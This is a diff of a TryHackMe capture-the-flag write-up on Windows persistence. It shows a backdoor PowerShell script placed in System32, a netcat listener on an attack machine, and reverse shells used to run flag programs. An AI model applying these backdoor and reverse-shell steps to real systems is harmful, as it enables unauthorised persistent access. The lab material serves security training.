@@ -11,7 +11,7 @@ This writeup was last updated: 07/05/2023
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)
 
-3. `PowerShell`
+3. `PowerShell` from the compromised Windows machine to
 ```PowerShell
 C:\Users\Administrator>PowerShell
 Windows PowerShell
@@ -40,7 +40,7 @@ PS C:\Users\Administrator> $scriptPath = 'C:\Windows\System32\BackdoorScript.ps1
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/Calculator%20New%20Properties.png)
 
-6. `nc -lvnp <PORT NUMBER>`
+6. `nc -lvnp <PORT NUMBER>`  from our Linux attack machine to
 ```Bash
 root@ip-10-10-210-65:~# nc -lnvp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
@@ -58,7 +58,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Windows\system32>
 ```
-8. `C:\flags\flag5.exe`
+8. `C:\flags\flag5.exe` from our reverse shell to run the **flag54.exe** program, which ended up displaying this task's flag onto our terminal
 ```PowerShell
 C:\Windows\system32>C:\flags\flag5.exe
 C:\flags\flag5.exe
@@ -85,7 +85,7 @@ C:\Users\Administrator>regedit
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/regedit%20.txt%20pt%202%20Zoomed%20In.png)
 
-3. `PowerShell`
+3. `PowerShell` from the compromised Windows machine
 ```PowerShell
 C:\Users\Administrator>PowerShell
 Windows PowerShell
@@ -116,7 +116,7 @@ PS C:\Users\Administrator>
 
 ![](https://github.com/JonmarCorpuz/TryHackMe-Writeups/blob/main/TryHackMe%20Module%20Task%20Writeups/Assets/New%20Value%20Data%20pt2.png)
 
-11. `nc -lvnp <PORT NUMBER>`
+11. `nc -lvnp <PORT NUMBER>` from our Linux attack machine to
 ```Bash
 root@ip-10-10-173-81:~# nc -lvnp 9999
 Listening on [0.0.0.0] (family 0, port 9999)
@@ -135,7 +135,7 @@ Microsoft Windows [Version 10.0.17763.1821]
 
 C:\Users\Administrator\Desktop>
 ```
-13. `C:\flags\flag6.exe`
+13. `C:\flags\flag6.exe` from our reverse shell to run the **flag6.exe** program, which ended up displaying this task's flag onto our terminal
 ```PowerShell
 C:\Users\Administrator\Desktop>C:\flags\flag6.exe
 C:\flags\flag6.exe
